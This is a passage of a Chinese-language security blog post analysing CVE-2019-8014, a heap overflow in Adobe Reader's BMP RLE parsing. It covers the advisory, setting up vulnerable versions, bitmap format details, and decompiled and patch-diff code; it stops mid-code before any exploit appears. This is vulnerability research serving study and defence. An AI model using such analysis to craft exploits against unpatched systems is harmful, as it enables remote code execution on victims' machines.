<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Adobe Reader,PDF,CVE-2019-8014,CVE-2013-2729,XFA,BMP,RLE,">





  <link rel="alternate" href="/atom.xml" title="程序人生" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">






<meta name="description" content="本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 修复 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。 本文作者：Ke Liu of Tencent Secu">
<meta name="keywords" content="Adobe Reader,PDF,CVE-2019-8014,CVE-2013-2729,XFA,BMP,RLE">
<meta property="og:type" content="article">
<meta property="og:title" content="深入分析 Adobe 忽略了 6 年的 PDF 漏洞">
<meta property="og:url" content="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/index.html">
<meta property="og:site_name" content="程序人生">
<meta property="og:description" content="本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 修复 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。 本文作者：Ke Liu of Tencent Secu">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2020-05-20T14:36:09.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="深入分析 Adobe 忽略了 6 年的 PDF 漏洞">
<meta name="twitter:description" content="本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 修复 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。 本文作者：Ke Liu of Tencent Secu">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/">





  <title>深入分析 Adobe 忽略了 6 年的 PDF 漏洞 | 程序人生</title>
  














</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">程序人生</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Fuzzing / Vulnerability / Exploit</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ke Liu">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.webp">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="程序人生">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">深入分析 Adobe 忽略了 6 年的 PDF 漏洞</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-12T00:13:37+00:00">
                2019-09-12
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/" itemprop="url" rel="index">
                    <span itemprop="name">Vulnerability</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/Analysis/" itemprop="url" rel="index">
                    <span itemprop="name">Analysis</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><em>本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 <strong><del>修复</del></strong> 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。</em></p>
<p>本文作者：<strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p>
<a id="more"></a>
<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>Adobe 在八月份为 Adobe Acrobat and Reader 发布了安全公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> ，和往常一样，这次更新修复了大量漏洞。当笔者在 <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> 上查看对应的漏洞公告时，目光迅速被 <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> 所吸引，因为模块 <code>AcroForm</code> 中 Bitmap 解析相关的漏洞非常少见。该漏洞在 ZDI 上的部分公告信息如下：</p>
<blockquote>
<p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p>
<p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p>
</blockquote>
<p>看描述这和六年之前修复的漏洞 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> 非常相似——都和 <strong>XFA Bitmap Run Length Encoding</strong> 解析有关！实际上，两个漏洞之间确实有着千丝万缕的联系，本文将详细分析漏洞的原理以及两者之间的关系。</p>
<p>漏洞 CVE-2019-8014 在 ZDI 上的致谢信息为 <code>ktkitty (https://ktkitty.github.io)</code> 。</p>
<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02. 环境搭建"></a>0x02. 环境搭建</h2><p>根据官方公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> 的描述，该漏洞影响 <code>2019.012.20035</code> 以及更早版本的 Adobe Acrobat and Reader ，而不受影响的最新版本号为 <code>2019.012.20036</code> 。本文基于前者进行漏洞分析、基于后者进行补丁分析。</p>
<p>安装 Adobe Acrobat Reader DC <code>2019.012.20035</code> 的步骤如下：</p>
<ol>
<li>下载并安装 <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">下载链接</a>)</li>
<li>升级到 <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">下载链接</a>)</li>
</ol>
<p>安装 Adobe Acrobat Reader DC <code>2019.012.20036</code> 的步骤如下：</p>
<ol>
<li>下载并安装 <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">下载链接</a>)</li>
</ol>
<p>在调试环境中安装好软件后，记得禁用更新服务 <em>Adobe Acrobat Update Service</em> 或者直接断开网络连接，防止 Adobe Acrobat Reader DC 自动更新。</p>
<h2 id="0x03-位图简介"><a href="#0x03-位图简介" class="headerlink" title="0x03. 位图简介"></a>0x03. 位图简介</h2><p>在进行漏洞分析之前，先简单介绍一下位图的结构。如果你对位图已经非常熟悉，那么可以直接跳过本小节内容。</p>
<h3 id="3-1-相关结构"><a href="#3-1-相关结构" class="headerlink" title="3.1 相关结构"></a>3.1 相关结构</h3><p>通常来说，位图文件由以下四部分构成：</p>
<ol>
<li>Bitmap File Header</li>
<li>Bitmap Info Header</li>
<li>RGBQUAD Array</li>
<li>Bitmap Data</li>
</ol>
<h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 文件标记 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// 位图文件的大小</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// 位图数据在文件中的偏移值</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure>
<h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// 结构体的大小</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// 位图宽度</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// 位图高度</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// 必须为 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// 每个像素所占用的位数</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// 压缩算法</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// 数据大小</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// 水平分辨率</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// 垂直分辨率</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// 色彩索引数</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// 必须的色彩索引数</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure>
<p>这里成员 <code>biCompression</code> 指明了位图所使用的压缩算法，部分压缩算法的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// 未使用压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// RLE8 压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// RLE4 压缩算法</span></span></span><br><span class="line"><span class="comment">// 其他压缩算法...</span></span><br></pre></td></tr></table></figure>
<h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> 描述一个像素的色彩组成，其定义如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure>
<p><strong>RGBQUAD Array</strong> 代表了一张色彩表，位图数据在解析之后可以是一个索引，索引在数组中对应的值便是该像素的色彩表示。该数组的长度取决于结构体 <strong>BITMAPINFOHEADER</strong> 中的 <code>biBitCount</code> 和 <code>biClrUsed</code> 成员的值。</p>
<h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>位图的位数据，该部分数据的表现形式取决于位图所使用的压缩算法。</p>
<p>有一点需要注意的是：位图数据是从左下角往右上角方向进行填充的，即位图数据中解析出来的第一个像素的色彩，应当填充到位图的左下角 [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)]，随后依次填充当前行的像素，当前行填充完毕之后，往上移动一个像素继续以行位单位进行填充，直到位图填充完毕。</p>
<h3 id="3-2-RLE-编码"><a href="#3-2-RLE-编码" class="headerlink" title="3.2 RLE 编码"></a>3.2 RLE 编码</h3><p>位图支持两种类型的 RLE（<strong>Run Length Encoding</strong>）压缩算法：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> 和 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> 。</p>
<h4 id="3-2-1-RLE8-编码"><a href="#3-2-1-RLE8-编码" class="headerlink" title="3.2.1 RLE8 编码"></a>3.2.1 RLE8 编码</h4><p>RLE8 压缩算法用于压缩 8 位位图（即每个像素占用 1 字节空间）。RLE8 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p>
<p><strong>编码模式</strong> 包含两字节数据：</p>
<ul>
<li>如果第一个字节不为零，其含义为第二个字节需要重复的次数</li>
<li>如果第一个字节为零，那么第二个字节的可能含义如下<ul>
<li>0x00 表示当前行已经结束</li>
<li>0x01 表示位图解析完毕</li>
<li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li>
</ul>
</li>
</ul>
<p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的字节是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p>
<p>下面为 RLE8 压缩之后的数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure>
<p>下面为解压之后的数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure>
<h4 id="3-2-2-RLE4-编码"><a href="#3-2-2-RLE4-编码" class="headerlink" title="3.2.2 RLE4 编码"></a>3.2.2 RLE4 编码</h4><p>RLE4 压缩算法用于压缩 4 位位图（即每个像素占用半字节空间）。RLE4 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p>
<p><strong>编码模式</strong> 包含两字节数据：</p>
<ul>
<li><p>如果第一个字节不为零，其含义为第二个字节展开后得到的像素个数</p>
<ul>
<li>第二个字节代表了两个像素的色彩索引</li>
<li>高 4 位代表第一个像素的色彩索引</li>
<li>低 4 位代表第二个像素的色彩索引</li>
<li>二者依次交替重复，直到得到第一个字节指定的像素个数</li>
</ul>
</li>
<li><p>如果第一个字节为零，那么第二个字节的可能含义如下</p>
<ul>
<li>0x00 表示当前行已经结束</li>
<li>0x01 表示位图解析完毕</li>
<li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li>
</ul>
</li>
</ul>
<p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的 <strong>半字节</strong> 是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p>
<p>下面为 RLE4 压缩之后的数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure>
<p>下面为解压之后的数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure>
<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04. 漏洞分析"></a>0x04. 漏洞分析</h2><h3 id="4-1-代码定位"><a href="#4-1-代码定位" class="headerlink" title="4.1 代码定位"></a>4.1 代码定位</h3><p>根据 ZDI 网站上的公告信息，可知漏洞位于 <strong>AcroForm</strong> 模块。该模块是 Adobe Acrobat Reader DC 中负责处理 <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA 表单</a> 的插件，其路径如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure>
<p>通常来说，借助 <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> 进行补丁对比分析可以快速定位到有漏洞的函数，但如果新旧版本的二进制文件变动比较大的话就不太好处理了，模块 <code>AcroForm.api</code> 的情况便是如此：通过对比发现有大量函数进行了改动，一个一个去看显然不太现实。</p>
<p>笔者用于定位漏洞函数的方法如下（以 <code>2019.012.20035</code> 为例）：</p>
<ol>
<li>在 <code>IDA</code> 中搜索字符串 <code>PNG</code> ，在 <code>.rdata:20F9A374</code> 找到一处定义</li>
<li>对 <code>20F9A374</code> 进行交叉引用查找，定位到函数 <code>sub_20CF3A3F</code> </li>
<li>很显然函数 <code>sub_20CF3A3F</code> 负责判断图片的类型（从这里也可以看出 XFA 表单所支持的图片格式类型）</li>
<li>对 <code>sub_20CF3A3F</code> 进行交叉引用查找，定位到函数 <code>sub_20CF4BE8</code> </li>
<li>函数 <code>sub_20CF4BE8</code> 根据图片的类型调用不同的处理函数</li>
<li>函数 <code>sub_20CF4870</code>（跳转自 <code>sub_20CF3E5F</code>）负责处理 <code>BMP</code> 位图</li>
</ol>
<p>在 BinDiff 的结果中可以看到，函数 <code>sub_20CF3E5F</code> 中确实有几个基本块发生了变动，比如 <code>20CF440F</code> 处的基本块的变动情况如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure>
<p>很明显，这里增加了对整数溢出的判断。</p>
<h3 id="4-2-漏洞分析"><a href="#4-2-漏洞分析" class="headerlink" title="4.2 漏洞分析"></a>4.2 漏洞分析</h3><p>好在网上已经有了针对 CVE-2013-2729 的详细分析报告（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a>），基于此可以快速理解函数 <code>sub_20CF3E5F</code> 中相关代码的含义。</p>
<h4 id="4-2-1-RLE8-解析"><a href="#4-2-1-RLE8-解析" class="headerlink" title="4.2.1 RLE8 解析"></a>4.2.1 RLE8 解析</h4><p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE8 压缩数据的部分代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 算法</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, 从左往右</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, 从下往上</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// 读取 2 字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// 第一个字节不为零</span></span><br><span class="line">      &#123;                                         <span class="comment">// 表示有压缩数据等待处理</span></span><br><span class="line">        <span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE 